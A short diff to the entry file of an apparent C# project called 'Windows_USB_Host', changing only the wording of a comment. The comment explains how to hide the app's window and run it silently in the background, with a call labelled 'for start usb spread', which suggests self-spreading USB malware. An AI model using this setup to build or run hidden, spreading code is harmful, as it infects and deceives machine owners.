@@ -21,7 +21,7 @@ namespace Windows_USB_Host
             Application.Run(new Form1());
 
             /*
-             you can remove above lines  + form 1
+             you can remove above lines  + remove form 1
              and also can add the lines below , if need app to run silent 
                 mnx.Start_work();// for start usb spread
                 Application.Run();//keeps app live in background
